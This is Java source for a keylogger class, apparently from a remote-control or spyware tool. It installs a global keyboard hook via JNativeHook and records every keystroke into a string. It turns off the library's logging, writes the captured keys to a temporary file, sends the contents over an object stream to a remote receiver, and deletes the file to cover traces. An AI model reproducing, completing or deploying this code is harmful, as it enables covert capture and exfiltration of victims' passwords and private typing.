package KeyLogger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;




public class KeyLogger implements NativeKeyListener {
	public volatile static String record = "";
	//public volatile static int count = 0;
	public volatile static boolean flag;
	public static ObjectOutputStream oos;
	public static String content="";
	public String key="";
	public File myObj;
	public KeyLogger(ObjectOutputStream oos) {
		// TODO Auto-generated constructor stub
		this.oos = oos;
		//this.record = record;
	}

	public  void nativeKeyPressed( NativeKeyEvent e) {
		//if(flag==false) {
		//myObj.delete();
		//System.out.println(count);
		//count++;
		//System.out.println("Pressed");
		record+=" "+NativeKeyEvent.getKeyText(e.getKeyCode());
		
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
                		GlobalScreen.unregisterNativeHook();
              		  
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
        	}
		//record = " ";

	}
	


	public void nativeKeyReleased(NativeKeyEvent e) {
	//	System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

	public void get_Keylogger(ObjectOutputStream oos) throws IOException {
		//System.out.println("thread added");
		//System.out.println(count);
		//count++;
		 File file = new File("key.txt");
		 
		 FileWriter fileWriter;
		 fileWriter = new FileWriter("key.txt");
		 PrintWriter printWriter  = new PrintWriter(fileWriter);
		 printWriter.print("k");           
		 printWriter.close();
		  LogManager.getLogManager().reset();
		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

		  logger.setLevel(Level.OFF);
		  
		 

		try {
			
			GlobalScreen.registerNativeHook();
		
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
	if(flag==false) {
		GlobalScreen.addNativeKeyListener(new KeyLogger(oos));}
		// myObj = new File("D:\\key.txt");
		//System.out.println("to here added");

	}
	
	public void delete() throws NativeHookException {
	//GlobalScreen.addNativeKeyListener(new KeyLogger(oos));

	//GlobalScreen.unregisterNativeHook();
	record = " ";
	//flag= true;

	}

	public void send_Keylogger() throws IOException {
		flag= true;
	//	System.out.println(flag);

		/*GlobalScreen.unregisterNativeHook();
		System.out.println(record);
		File myObj = new File("D:\\key.txt");
		FileWriter fileWriter = new FileWriter("D:\\key.txt");
	    PrintWriter printWriter = new PrintWriter(fileWriter);
	    printWriter.print(record);              		  
		printWriter.close();
		//Escape();*/
		// printWriter.close();
		
		//GlobalScreen.registerNativeHook();
		  LogManager.getLogManager().reset();
		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

		  logger.setLevel(Level.OFF);
		//record = " ";

		  myObj = new File("key.txt");
			FileWriter fileWriter = null;
			try {
				fileWriter = new FileWriter("key.txt");
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		    PrintWriter printWriter  = new PrintWriter(fileWriter);
		    printWriter.print(record);           
		    printWriter.close();
		try {
			GlobalScreen.unregisterNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//myObj = new File("D:\\key.txt");
		Path fileName = Path.of("key.txt");
		try {
			content = Files.readString(fileName);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//System.out.println(content.length());
		
	  	if(content.length() == 1 && record==" "  ) {
	  		//File file= new File("D:\\key.txt");
	  		//myObj.delete();
	  		String err="No key recorded";
			try {
				oos.writeObject(err);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
	  	} else {
	  //	File file= new File("key.txt");
    	//file.delete();
		oos.writeObject(content);}
	
	   File file= new File("key.txt");
	    file.delete();

	}
}